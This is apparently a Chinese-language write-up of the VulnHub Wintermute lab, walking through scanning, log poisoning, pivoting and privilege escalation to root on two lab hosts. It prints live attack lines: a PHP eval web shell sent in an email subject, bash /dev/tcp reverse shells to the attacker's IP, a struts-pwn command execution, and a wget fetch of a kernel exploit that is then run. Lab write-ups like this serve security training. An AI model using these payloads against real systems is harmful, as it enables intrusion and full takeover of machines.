:::info

kali：192.168.56.138

straylight：192.168.56.x  192.168.89.x

Neuromancer：192.168.89.x

:::

![image-20250120173723292](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250120173723292.png)

![image-20250120173741772](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250120173741772.png)

## port scan

```shell
# Nmap 7.94SVN scan initiated Sun Jan 19 06:50:23 2025 as: nmap -sT --min-rate=10000 -p- -oN port 192.168.56.102
Nmap scan report for 192.168.56.102 (192.168.56.102)
Host is up (0.016s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
3000/tcp open  ppp
```

```shell
# Nmap 7.94SVN scan initiated Sun Jan 19 06:51:07 2025 as: nmap -sT -sV -sC -O -p25,80,3000 -oN detils 192.168.56.102
Nmap scan report for 192.168.56.102 (192.168.56.102)
Host is up (0.0013s latency).

PORT     STATE SERVICE         VERSION
25/tcp   open  smtp            Postfix smtpd
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
| ssl-cert: Subject: commonName=straylight
| Subject Alternative Name: DNS:straylight
| Not valid before: 2018-05-12T18:08:02
|_Not valid after:  2028-05-09T18:08:02
80/tcp   open  http            Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Night City
3000/tcp open  hadoop-datanode Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: submit
|_http-trane-info: Problem with XML parsing of /evox/about
| hadoop-tasktracker-info: 
|_  Logs: submit
| http-title: Welcome to ntopng
|_Requested resource was /lua/login.lua?referer=/
MAC Address: 08:00:27:9C:3F:44 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Host:  straylight
```

## web

3000端口是Apache Hadoop ntopng服务，监测网路流量

默认密码`admin:admin`登录成功

![image-20250120174412785](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250120174412785.png)

发现访问本地http服务，路径：/turing-bolo/ 

观察url发现，可能存在文件包含漏洞，尝试了`passwd,hosts`等文件是失败的

根据扫描结果知道存在smtp服务的，可以看一下/var/log/mail文件

http://192.168.56.102/turing-bolo/bolo.php?bolo=/var/log/mail

成功包含

利用`smtp-user-enum`工具进行操作

```shell
┌──(kali㉿kali)-[~/vulnhub/Wintermute-Lab]
└─$ smtp-user-enum -M VRFY -u root -t 192.168.56.102
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Target count ............. 1
Username count ........... 1
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Mon Jan 20 04:51:48 2025 #########
192.168.56.102: root exists
######## Scan completed at Mon Jan 20 04:51:48 2025 #########
1 results.

1 queries in 1 seconds (1.0 queries / sec)
```

发现日志文件有增加，可以尝试日志包含RCE

使用telnet发送恶意邮件，在邮件主题中包括一些php代码

```
root@kali:~# telnet 192.168.56.102 25
Trying 192.168.56.102...
Connected to 192.168.56.102.
Escape character is '^]'.
220 straylight ESMTP Postfix (Debian/GNU)
HELO hack.com
250 straylight
MAIL FROM: hacker@hack.com
250 2.1.0 Ok
RCPT TO: wintermute
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
subject: <?php eval($_REQUEST['1']); ?>
hacked!!
.
250 2.0.0 Ok: queued as EC8E454D7
quit
221 2.0.0 Bye
Connection closed by foreign host.
```

```
smtp-user-enum -M VRFY -u '<?php phpinfo();' -t 192.168.56.102
```

拿到shell

```
/bin/bash -i >& /dev/tcp/192.168.56.138/1234 0>&1
```

## 提权

```shell
www-data@straylight:/tmp$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/bin/screen-4.5.0
```

`searchsploit screen 4.5.0`

提权成功到root

```shell
root@straylight:/root# cat flag.txt
cat flag.txt
5ed185fd75a8d6a7056c96a436c6d8aa
root@straylight:/root# cat note.txt
cat note.txt
Devs,

Lady 3Jane has asked us to create a custom java app on Neuromancer's primary server to help her interact w/ the AI via a web-based GUI.

The engineering team couldn't strss enough how risky that is, opening up a Super AI to remote access on the Freeside network. It is within out internal admin network, but still, it should be off the network completely. For the sake of humanity, user access should only be allowed via the physical console...who knows what this thing can do.

Anyways, we've deployed the war file on tomcat as ordered - located here:

/struts2_2.3.15.1-showcase

It's ready for the devs to customize to her liking...I'm stating the obvious, but make sure to secure this thing.

Regards,

Bob Laugh
Turing Systems Engineer II
Freeside//Straylight//Ops5
```

## 横向

存在第二张网卡：192.168.89.3

直接上传fscan扫描了

```
root@straylight:/tmp# ./fscan -h 192.168.89.0/24
```

存在 (icmp) Target 192.168.89.7    is alive

扫描全端口

```
root@straylight:/tmp# ./fscan -p 1-65535 -h 192.168.89.7
./fscan -p 1-65535 -h 192.168.89.7

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
192.168.89.7:8009 open
192.168.89.7:8080 open
192.168.89.7:34483 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://192.168.89.7:8080  code:200 len:11236  title:Apache Tomcat/9.0.0.M26
已完成 3/3
[*] 扫描结束,耗时: 7.067726178s
```

8009,8080,34483三个端口

用`socat`转发端口

TCP协议 监听本地 8080 端口，并将请求转发(代理)到`192.168.89.7:8080`上

```
socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.89.7:8080 &
socat TCP-LISTEN:8009,reuseaddr,fork TCP:192.168.89.7:8009 &
socat TCP-LISTEN:34483,reuseaddr,fork TCP:192.168.89.7:34483 &
```

```shell
root@straylight:/tmp# socat TCP-LISTEN:8080,reuseaddr,fork TCP:192.168.89.7:8080 &
<-LISTEN:8080,reuseaddr,fork TCP:192.168.89.7:8080 &
[1] 4398
```

访问：http://192.168.56.102:8080/struts2_2.3.15.1-showcase即可

扫描端口结果如下

```shell
# Nmap 7.94SVN scan initiated Mon Jan 20 06:08:39 2025 as: nmap -sVC -O -p8009,8080,34483 -oN detils-last 192.168.56.102
Nmap scan report for 192.168.56.102 (192.168.56.102)
Host is up (0.0014s latency).

PORT      STATE SERVICE VERSION
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp  open  http    Apache Tomcat 9.0.0.M26
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.0.M26
34483/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:9b:4a:a9:c0:fc:0b:d8:ef:f1:e3:9d:f4:59:25:32 (RSA)
|   256 f6:2a:de:07:36:36:00:e9:b5:5d:2f:aa:03:79:91:d1 (ECDSA)
|_  256 38:3c:a8:ed:91:ea:ce:1d:0d:0f:ab:51:ac:97:c8:fb (ED25519)
MAC Address: 08:00:27:9C:3F:44 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

struts2_2.3.15.1-showcase给了详细版本，找到漏洞利用脚本

https://github.com/mazen160/struts-pwn

```shell
┌──(kali㉿kali)-[~/vulnhub/Wintermute-Lab/struts-pwn]
└─$ python3 struts-pwn.py -u http://192.168.56.102:8080/struts2_2.3.15.1-showcase/showcase.jsp -c 'id'

[*] URL: http://192.168.56.102:8080/struts2_2.3.15.1-showcase/showcase.jsp
[*] CMD: id
[!] ChunkedEncodingError Error: Making another request to the url.
Refer to: https://github.com/mazen160/struts-pwn/issues/8 for help.
EXCEPTION::::--> ("Connection broken: InvalidChunkLength(got length b'', 0 bytes read)", InvalidChunkLength(got length b'', 0 bytes read))
Note: Server Connection Closed Prematurely

uid=1000(ta) gid=1000(ta) groups=1000(ta),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

[%] Done.
```

成功执行命令

在做一个端口转发，然后进行反弹shell

```
socat TCP-LISTEN:8000,reuseaddr,fork TCP:192.168.56.138:8000 &
```

```shell
python3 struts-pwn.py -u http://192.168.56.102:8080/struts2_2.3.15.1-showcase/showcase.jsp -c '/bin/bash -i >& /dev/tcp/192.168.89.3/8000 0>&1'
```

### 内核提权

```shell
ta@neuromancer:/$ uname -a
uname -a
Linux neuromancer 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
ta@neuromancer:/$ cat /etc/*rele*
cat /etc/*rele*
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
NAME="Ubuntu"
VERSION="16.04.4 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.4 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

```
searchsploit 4.4.0 ubuntu -m 44298
```

然后在做一个端口转发，将文件上传到机器上

```
socat TCP-LISTEN:800,reuseaddr,fork TCP:192.168.56.138:800 &
```

kali上：python3 -m http.server 800

```shell
ta@neuromancer:/tmp$ wget http://192.168.89.3:800/exploit
wget http://192.168.89.3:800/exploit
--2025-01-20 04:18:53--  http://192.168.89.3:800/exploit
Connecting to 192.168.89.3:800... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14032 (14K) [application/octet-stream]
Saving to: ‘exploit’

exploit             100%[===================>]  13.70K  --.-KB/s    in 0s      

2025-01-20 04:18:53 (299 MB/s) - ‘exploit’ saved [14032/14032]
```

```shell
ta@neuromancer:/tmp$ chmod +x exploit
chmod +x exploit
ta@neuromancer:/tmp$ ./exploit
./exploit
task_struct = ffff88003a7072c0
uidptr = ffff8800355e7484
spawning root shell
root@neuromancer:/tmp# whoami
whoami
root
root@neuromancer:~# cd /root
cd /root
root@neuromancer:~# cat flag.txt
cat flag.txt
be3306f431dae5ebc93eebb291f4914a                  
```

